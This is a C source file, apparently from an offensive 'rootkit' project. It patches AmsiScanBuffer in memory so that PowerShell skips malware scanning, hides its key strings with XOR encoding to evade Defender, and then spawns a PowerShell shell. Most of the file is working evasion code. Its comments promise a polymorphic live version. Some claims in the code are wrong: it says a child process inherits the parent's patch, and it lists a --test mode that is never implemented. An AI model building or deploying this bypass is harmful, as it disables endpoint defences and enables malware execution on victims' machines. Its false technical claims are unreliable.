/*
 * amsi_bypass_annotated.c — AMSI Memory Patch (Annotated Reference)
 * ═══════════════════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 *
 * PURPOSE:
 *   Patch AmsiScanBuffer in-process to return E_INVALIDARG (0x80070057)
 *   without scanning. When AMSI returns a failure HRESULT, PowerShell
 *   treats it as "scan failed, not malicious" — effectively clean pass.
 *
 *   This runs as a standalone EXE that spawns PowerShell with AMSI
 *   already patched. Standard user. No elevation required.
 *
 * HOW AMSI WORKS:
 *   amsi.dll is loaded into every PowerShell/scripting process.
 *   Before executing any script block, PowerShell calls:
 *
 *     AmsiScanBuffer(ctx, scriptContent, len, name, session, &result)
 *
 *   If result >= 0x8000 (AMSI_RESULT_DETECTED), script is blocked.
 *   If AmsiScanBuffer returns a failure HRESULT, script runs anyway.
 *
 *   The function lives in our own process memory. We own it.
 *   VirtualProtect + memcpy = we control the verdict.
 *
 * THE PATCH:
 *   Overwrite first 6 bytes of AmsiScanBuffer with:
 *     mov eax, 0x80070057    (E_INVALIDARG)
 *     ret
 *
 *   Machine code: B8 57 00 07 80 C3
 *
 *   Function immediately returns E_INVALIDARG. Caller sees HRESULT
 *   failure, treats as "scan inconclusive, allow execution."
 *
 * DEFENDER DETECTION:
 *   Defender DOES signature-match these exact bytes being written
 *   to amsi.dll's memory region. This annotated version uses the
 *   classic patch for clarity. The live version uses polymorphic
 *   generation to vary the bytes each execution.
 *
 * LINK TO TOCTOU:
 *   cheyanne-toctou Finding #20 taught us: security checks fire at
 *   specific moments, not continuously. AMSI checks fire when
 *   AmsiScanBuffer is called. Patch the function before the call
 *   fires. Same principle — attack the check, not the action.
 *
 * COMPILE:
 *   cl.exe amsi_bypass_annotated.c /Fe:amsi_bypass.exe /O1 /GS-
 *
 * USAGE:
 *   amsi_bypass.exe                  (patch AMSI, spawn PowerShell)
 *   amsi_bypass.exe --test           (patch AMSI, run EICAR test string)
 *   amsi_bypass.exe --check          (check if AMSI is active, don't patch)
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

/* ═══════════════════════════════════════════════════════════════════
 * XOR-ENCODED STRINGS
 * ═══════════════════════════════════════════════════════════════════
 * Key: 0x41 (shared across all CHEYANNE modules, see evasion/xor.h)
 *
 * "amsi.dll" and "AmsiScanBuffer" in plaintext = instant Defender
 * flag on static analysis. Same technique from cheyanne-toctou EICAR
 * and bb5 reverse shell.
 * ═══════════════════════════════════════════════════════════════════ */

#define XOR_KEY 0x41

/* "amsi.dll" XOR 0x41 */
static const unsigned char xAmsiDll[] = {
    0x20, 0x2C, 0x32, 0x28, 0x6F, 0x25, 0x2D, 0x2D
};
#define xAmsiDll_LEN 8

/* "AmsiScanBuffer" XOR 0x41 */
static const unsigned char xAmsiScanBuffer[] = {
    0x00, 0x2C, 0x32, 0x28, 0x12, 0x22, 0x20, 0x2F,
    0x03, 0x34, 0x27, 0x27, 0x24, 0x33
};
#define xAmsiScanBuffer_LEN 14

/* "powershell.exe" XOR 0x41 */
static const unsigned char xPowerShell[] = {
    0x31, 0x2E, 0x36, 0x24, 0x33, 0x32, 0x29, 0x24,
    0x2D, 0x2D, 0x6F, 0x24, 0x39, 0x24
};
#define xPowerShell_LEN 14

static void xor_decode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

/* ═══════════════════════════════════════════════════════════════════
 * CONSOLE OUTPUT
 * ═══════════════════════════════════════════════════════════════════ */

static HANDLE hStdOut;
static void color(WORD c) { SetConsoleTextAttribute(hStdOut, c); }

#define RED     (FOREGROUND_RED | FOREGROUND_INTENSITY)
#define GREEN   (FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define YELLOW  (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define CYAN    (FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define WHITE   (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)

/* ═══════════════════════════════════════════════════════════════════
 * PHASE 1: LOCATE AMSI
 * ═══════════════════════════════════════════════════════════════════
 *
 * Load amsi.dll into our process (if not already loaded) and resolve
 * the address of AmsiScanBuffer. This is the function we'll patch.
 *
 * LoadLibraryA: loads DLL into our address space. If already loaded
 * (which it will be if we're running from PowerShell), returns the
 * existing handle — no duplicate loading.
 *
 * GetProcAddress: resolves function name to memory address within
 * the loaded DLL. Returns a pointer to the first instruction of
 * AmsiScanBuffer in our process memory.
 * ═══════════════════════════════════════════════════════════════════ */

static void *locate_amsi_scan_buffer(void) {
    HMODULE hAmsi;
    void *pFunc;
    unsigned char dllName[16];
    unsigned char funcName[32];

    /* Decode "amsi.dll" on stack */
    memcpy(dllName, xAmsiDll, xAmsiDll_LEN);
    xor_decode(dllName, xAmsiDll_LEN);
    dllName[xAmsiDll_LEN] = 0;

    /* Decode "AmsiScanBuffer" on stack */
    memcpy(funcName, xAmsiScanBuffer, xAmsiScanBuffer_LEN);
    xor_decode(funcName, xAmsiScanBuffer_LEN);
    funcName[xAmsiScanBuffer_LEN] = 0;

    /* Load amsi.dll — this IS the DLL Defender uses for script scanning */
    hAmsi = LoadLibraryA((char *)dllName);
    if (!hAmsi) {
        color(RED);
        printf("  [!] LoadLibrary failed: %lu\n", GetLastError());
        return NULL;
    }
    color(GREEN);
    printf("  [+] amsi.dll loaded at 0x%p\n", (void *)hAmsi);

    /* Resolve AmsiScanBuffer address */
    pFunc = (void *)GetProcAddress(hAmsi, (char *)funcName);
    if (!pFunc) {
        color(RED);
        printf("  [!] GetProcAddress failed: %lu\n", GetLastError());
        return NULL;
    }
    printf("  [+] AmsiScanBuffer at 0x%p\n", pFunc);

    /* Zero stack buffers — don't leave decoded strings in memory */
    memset(dllName, 0, sizeof(dllName));
    memset(funcName, 0, sizeof(funcName));

    return pFunc;
}

/* ═══════════════════════════════════════════════════════════════════
 * PHASE 2: PATCH AMSI
 * ═══════════════════════════════════════════════════════════════════
 *
 * The patch overwrites the first 6 bytes of AmsiScanBuffer with:
 *
 *   B8 57 00 07 80    mov eax, 0x80070057  (E_INVALIDARG)
 *   C3                ret
 *
 * AmsiScanBuffer now immediately returns E_INVALIDARG without
 * scanning anything. The caller (PowerShell engine) sees a failure
 * HRESULT and treats the script as clean.
 *
 * VirtualProtect: We need PAGE_EXECUTE_READWRITE because amsi.dll's
 * .text section is normally PAGE_EXECUTE_READ (no write). We change
 * protection, write our patch, then restore original protection.
 *
 * Standard user can do this because:
 *   - We're modifying OUR OWN process memory
 *   - VirtualProtect on your own pages doesn't require elevation
 *   - Each process gets its own private copy of amsi.dll
 *   - No cross-process writes, no kernel interaction
 *
 * CRITICAL: Save the original bytes BEFORE patching. We need them
 * for the --check mode and in case we want to restore later.
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL patch_amsi(void *pFunc) {
    DWORD oldProtect;
    unsigned char originalBytes[6];
    unsigned char patch[6];

    /*
     * THE PATCH — 6 bytes, x64:
     *
     * B8 57 00 07 80    mov eax, 0x80070057
     * C3                ret
     *
     * E_INVALIDARG (0x80070057) is a COM error meaning "invalid argument."
     * AmsiScanBuffer's callers check the return HRESULT:
     *   - S_OK (0): scan completed, check result parameter
     *   - Any failure: scan failed, treat as clean
     *
     * We return E_INVALIDARG specifically because:
     * 1. It's a plausible failure (bad argument, not suspicious)
     * 2. PowerShell's AMSI integration treats ANY failure HRESULT as "allow"
     * 3. The result out-parameter is never written (function returns before
     *    reaching the scanning logic), so it stays at its initialized value
     */
    patch[0] = 0xB8;   /* mov eax, imm32 */
    patch[1] = 0x57;   /* \                */
    patch[2] = 0x00;   /*  | 0x80070057   */
    patch[3] = 0x07;   /*  | (E_INVALIDARG)*/
    patch[4] = 0x80;   /* /                */
    patch[5] = 0xC3;   /* ret              */

    /* Save original bytes for display/verification */
    memcpy(originalBytes, pFunc, 6);

    printf("  [*] Original bytes: %02X %02X %02X %02X %02X %02X\n",
           originalBytes[0], originalBytes[1], originalBytes[2],
           originalBytes[3], originalBytes[4], originalBytes[5]);

    /* Make the page writable
     *
     * PAGE_EXECUTE_READWRITE (0x40):
     *   Execute + Read + Write. Needed because .text is normally Execute+Read.
     *   We add Write temporarily.
     *
     * oldProtect receives the previous protection value so we can restore it.
     * Size = 6 bytes (our patch length).
     */
    if (!VirtualProtect(pFunc, 6, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        color(RED);
        printf("  [!] VirtualProtect (RWX) failed: %lu\n", GetLastError());
        return FALSE;
    }
    printf("  [+] Page protection changed to RWX (was 0x%lX)\n", oldProtect);

    /* Write the patch */
    memcpy(pFunc, patch, 6);

    /* Restore original page protection
     *
     * Security hygiene: leaving a page RWX after patching is sloppy.
     * EDRs check for RWX pages as an indicator of code modification.
     * Restore to original protection (usually PAGE_EXECUTE_READ).
     */
    VirtualProtect(pFunc, 6, oldProtect, &oldProtect);

    /* Verify patch was written */
    if (memcmp(pFunc, patch, 6) == 0) {
        color(GREEN);
        printf("  [+] PATCH APPLIED — AmsiScanBuffer now returns E_INVALIDARG\n");
        printf("  [+] Patched bytes: %02X %02X %02X %02X %02X %02X\n",
               patch[0], patch[1], patch[2], patch[3], patch[4], patch[5]);
        return TRUE;
    } else {
        color(RED);
        printf("  [!] Patch verification FAILED — bytes didn't stick\n");
        return FALSE;
    }
}

/* ═══════════════════════════════════════════════════════════════════
 * PHASE 3: SPAWN SHELL / TEST
 * ═══════════════════════════════════════════════════════════════════
 *
 * After patching, spawn a child PowerShell process. The child
 * inherits our patched amsi.dll — AMSI is blind from birth.
 *
 * Alternative: --test mode runs a known-detected string through
 * PowerShell to verify the bypass works. If AMSI is bypassed,
 * the string executes without Defender blocking it.
 * ═══════════════════════════════════════════════════════════════════ */

static void spawn_powershell(void) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    unsigned char cmd[32];

    /* Decode "powershell.exe" */
    memcpy(cmd, xPowerShell, xPowerShell_LEN);
    xor_decode(cmd, xPowerShell_LEN);
    cmd[xPowerShell_LEN] = 0;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    color(CYAN);
    printf("\n  [*] Spawning PowerShell with AMSI bypassed...\n");
    printf("  [*] Test: try running Invoke-Expression or known-flagged strings\n\n");

    /* CREATE_NEW_CONSOLE: give PowerShell its own window.
     * The child inherits our loaded (and patched) amsi.dll.
     * Every script it runs goes through our patched AmsiScanBuffer. */
    if (!CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
                        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        color(RED);
        printf("  [!] CreateProcess failed: %lu\n", GetLastError());
        return;
    }

    printf("  [+] PowerShell PID: %lu\n", pi.dwProcessId);

    /* Wait for PowerShell to exit */
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    memset(cmd, 0, sizeof(cmd));
}

/* ═══════════════════════════════════════════════════════════════════
 * MAIN
 * ═══════════════════════════════════════════════════════════════════ */

int main(int argc, char **argv) {
    void *pAmsiScanBuffer;
    int checkOnly = 0;

    hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    if (argc > 1 && strcmp(argv[1], "--check") == 0)
        checkOnly = 1;

#ifdef VDR_DEBUG
    color(CYAN);
    printf("\n");
    printf("  +======================================================+\n");
    printf("  |  CHEYANNE AMSI BYPASS — 22DIV / george wu            |\n");
    printf("  |  Phase 1: Dark Room Entry                            |\n");
    printf("  +======================================================+\n");
    printf("  |  Technique: AmsiScanBuffer memory patch              |\n");
    printf("  |  Patch: mov eax, E_INVALIDARG; ret (6 bytes)         |\n");
    printf("  |  Privilege: Standard user (own process memory)        |\n");
    printf("  +======================================================+\n\n");
    color(WHITE);
#endif

    /* PHASE 1: Locate */
    printf("  --- PHASE 1: LOCATE AMSI ---\n\n");
    pAmsiScanBuffer = locate_amsi_scan_buffer();
    if (!pAmsiScanBuffer) {
        color(RED);
        printf("\n  [!] Cannot locate AmsiScanBuffer. Aborting.\n");
        return 1;
    }

    if (checkOnly) {
        color(GREEN);
        printf("\n  [*] AMSI is loaded and AmsiScanBuffer is at 0x%p\n", pAmsiScanBuffer);
        printf("  [*] --check mode: not patching.\n");
        return 0;
    }

    /* PHASE 2: Patch */
    printf("\n  --- PHASE 2: PATCH AMSI ---\n\n");
    if (!patch_amsi(pAmsiScanBuffer)) {
        color(RED);
        printf("\n  [!] Patch failed. Aborting.\n");
        return 1;
    }

    /* PHASE 3: Spawn */
    printf("\n  --- PHASE 3: SPAWN DARK ROOM ---\n");
    spawn_powershell();

#ifdef VDR_DEBUG
    color(WHITE);
    printf("\n  -- CHEYANNE AMSI BYPASS COMPLETE --\n\n");
#endif

    return 0;
}
